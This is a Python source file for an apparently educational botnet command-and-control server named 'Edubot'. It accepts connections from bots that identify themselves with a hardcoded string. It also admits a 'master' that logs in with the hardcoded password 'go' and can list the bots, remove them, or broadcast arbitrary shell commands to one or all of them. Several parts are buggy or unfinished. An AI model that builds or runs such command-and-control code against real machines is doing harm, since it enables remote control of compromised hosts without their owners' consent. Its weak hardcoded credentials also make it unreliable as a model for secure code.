"""

Author: Sunggwan Choi 

Description: Server.py is the server which handles all the bot connection. 
It's main purpose is to send commands from the master to the connected bots, 
and retrieve result from the bots. 

Server.py is barely finished.

TODO: 
    - Create a class for server. For the love of god stop using global variables.
    - Please stop cooking spaghetti 
    - Need argparse to parse commandline options 
    - Create a parse command function 
    - Add more functionality to the cli of the server. 

"""



import socket
import threading
import subprocess
import sys
import time
import errno

class Bot:
    def __init__(self, sock, idx, ip, port):
        self.sock = sock        # I am stupid :( 
        self.idx = idx
        self.ip = ip
        self.port = port

    def prettyPrint(self):
        return "\n["+str(self.idx)+"] "+self.ip+":"+str(self.port)

# TODO: Implement this 
class Server:
    def __init__(self, bots, idx, socketz, threads):
        pass

"""
Description: Threaded funciton which takes care of individual bot's socket 
Receives data from the bot, and does error handling 

Param: 
    - (bot) bot = Individual bot 
    - (sock) sock = Socket of the bot 
"""
def individual_bot_sock(bot,sock):
    while True:       
        try:
            data = sock.recv(1024).decode()
            print (data)
        except Exception as e:
            print("[-] Bot disconnected.")
            bots.remove(bot)
            break
        if not data:
            print("[-] Bot disconnected.")
            bots.remove(bot)
            break

    sock.close()

"""
Name: addBot
Description: Create a bot object and add the bot to the list 
Param:
    - ([bot])       bots: list of bots to append the bot
    - (socket)      sock: current connected socket
Return:
    - ([bot])       bots: updated list of bots
    - ([thread])    threads: updated list of thread
"""
def addBot(bots, sock, threads):
    bot = Bot(sock, idx, sock.getpeername()[0], sock.getpeername()[1])
    
    bots.append(bot)
    print("[+] Adding a new bot[", idx, "] ip:", bot.ip, " port:", str(bot.port), sep='')

    # Starting a new thread for specific bot connected
    thread = threading.Thread(target=individual_bot_sock, args=(bot,bot.sock,))
    threads.append(thread)
    thread.start()

    print("[+] Created a new thread for bot: ", bot.idx)

    return bots, threads

"""
Name: checkConnection
Description: Check connected socket and determine if it's a client/master/opponent
Param:
    - (socket) sock: Currently received socket 
Return:
    (int) 1: socket is a client connection  
    (int) 2: socket is a master connection 
    (int) 3: socket is an opponent connection 
"""
def checkConnection(sock):
    identifer = sock.recv(1024).decode().rstrip()

    if identifer == "Edub07_c1i3nt":
        return 1

    elif identifer == "Edub07_m4st3r":
        print("[DEBUG] master connected.")
        
        for i in range(3):
            try:
                prompt = "Password: "
                sock.send(prompt.encode())
                passwd = sock.recv(1024).decode()
                
                if passwd == "go":
                    return 2

                else:
                    continue
            except Exception as err:
                print("[-] Master have exited the connection.")
                sock.close()
                return 3

        print("Temporary Banning IP, since there were 3 consecutive failure.")
        return 3
                
    else:
        print("[DEBUG] connection not edubot. Closing socket.")
        sock.close() # TODO uncomment!
        return 1

"""
Name: sendCommand
Description: Sends master's command to all the bots

Takes in list of commands 


Param:
    ([bot]) bots: list of object "bot" 
"""
def sendCommand(bots, command):
    for bot in bots:
        try:
            bot.sock.send(command.encode())
        except socket.error as e:
            # If socket returns errno 32 broken pipe, remove the bot from the list 
            if e[0] == error.EPIPE:
                print("[ERROR] Client[", bots.index(bot), "]'s socket died.", sep='')
                bots.remove(bot)
            else:
                printf("[ERROR] Unknown error occurred.", e)

    return bots

"""
Description: Parses the command from the user, returns command type and command itself
Param:
    - (str) command 
Return:
    - (int) cmdType = 1: single, 2: targeted, 3: Something is wrong  

def parseCommand(command):
    tokens = command.split(" ",1)

    if len(tokens) == 1:
        if str(tokens[0]) == "ls":
            return 1, "ls"
"""


"""
Description: Execute Command based on different command tokens 
Param: 
    - (bot list) bots = List of bots 
    - (list) tokens = List of commands, splitted by spaces 
    - (socket) mastersock = Master socket 

Return; 
    - (None) Sends debug message back to the master socket 

"""
def execCommand(bots, tokens, mastersock):

    # ls command. Either ls or ls <ip_addr> 
    if tokens[0] == "ls":
        lsResult = '' 

        if len(tokens) == 1:
             
            # If there are no bots 
            if len(bots) == 0:
                mastersock.send("[-] No bots available".encode())
            for bot in bots:
                lsResult += bot.prettyPrint()

            mastersock.send(lsResult.encode())

        elif len(tokens) == 2:
            for bot in bots:
                if bot.ip == tokens[1]:
                    lsResult += bot.prettyPrint()

            mastersock.send(lsResult.encode())

    # Send specific bot command 
    elif tokens[0].isdigit():
        print("[+] Bot[" + str(tokens[0]) + "]. Command: ", tokens[1])

        # Send command, receive result, and send the result back to the master socket.
        for bot in bots:
            if bot.idx == int(tokens[0]):
                bot.sock.send(" ".join(tokens[1:]).encode())
                #result = bot.sock.recv(4096).decode()

                # Sends back the debug message because master expects that 
                result = "\n[+] Bot[" + str(tokens[0]) + "]. Command: " + str(tokens[1])
                result +=  "\nCommand successfully delivered to all bots.\n"
                mastersock.send(result.encode())

    elif tokens[0] == "remove":
        if len(tokens) == 2 and tokens[1].isdigit():
            for bot in bots:
                if bot.idx == int(tokens[1]):
                    print(type(bot.idx))
                    print("[*] Removing bot: ", str(bot.idx))
                    bots.remove(bot)

    elif tokens[0] == "refresh":
        mastersock.send("\nRefreshing the bot list".encode())
        for bot in bots:
            bot.sock.send("id".encode())

    elif tokens[0] == "broadcast":
        print("[+] Sending broadcast command to all bots")
        for bot in bots:
            bot.sock.send(" ".join(tokens[1:]).encode())
            mastersock.send("\nCommand successfully delivered to all bots\n".encode())

    else:
        print("[DEBUG] token length = ", len(tokens))
        mastersock.send("Wrong command".encode())


def debug(string):
    print("[DEBUG]", string)

"""
Description: Master socket function which handles socket with the Master. 
Specifically handles command the master issues 

Param: 
    - (socket) sock = Socket which will become master's socket 
    - (list) bots = Lits of current bots that Master is able to conrol 
"""
def masterSocket(sock, bots):
    sock.send("Welcome to master shell!".encode())
    
    while True:
        try:
            command = sock.recv(4096).decode()
            tokens = command.split(" ",1)

            execCommand(bots, tokens, sock)

        except Exception as err:
            print("[-] Master connection exited.", err)
            break

    sock.close()

# Creates Master thread. Server allows multiple masters 
def createMasterThread(sock, sockets):
    thread = threading.Thread(target=masterSocket, args=(sock,sockets,))
    thread.start()

"""
Description: setup the server. Bind to the corresponding port
Param:
    - (int) port = Port to bind 
Return:
    - (socket) sock = Binded socket. This is going to be the main server socket. 
"""
# Uhm shouldn't this be serverSetup(host, port) with sock.bind((host,port)) ? Debug?
def serverSetup(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.bind(('', port))
        print("[+] Server socket binded to port: ", port)

    except Exception as err:
        print("[ERROR] Could not bind to port: ", port)
        print("[ERROR] Error message: ", err)
        exit(1)

    sock.listen(1)

    return sock





###################################################################
#                          Start of Main 
###################################################################

def main():

    # Global variables because I am a bad programmer. 
    # TODO: But really, need refactoring of this part 
    # TODO: Probably need a "server" class? :eyes: ? 

    global host
    global port
    global port
    global bots
    global idx
    global threads
    global socketz

    host = ""
    port = int(sys.argv[1])
    bots = []
    idx = 0
    threads = []
    socketz = []

    # Setting up server socket, bind, and listen
    sock = serverSetup(port)

    print("Edubot Server Starting...")

    while True:
        conn, addr = sock.accept()

        # Check if incoming socket is client, master, or opponent
        sockType = checkConnection(conn) 

        # If incoming socket is client, add to bot list 
        if sockType == 1:
            bots, threads = addBot(bots, conn, threads)
            socketz.append(conn)
            idx += 1
            
            for bot in bots:
                bot.prettyPrint()

        # If incoming socket is master, start a master thread 
        elif sockType == 2:
            print("Master is here.")

            createMasterThread(conn, bots)
         
        else:
            pass

    print("Edubot Server Stopped.")
    sock.close()

if __name__ == '__main__':
    main()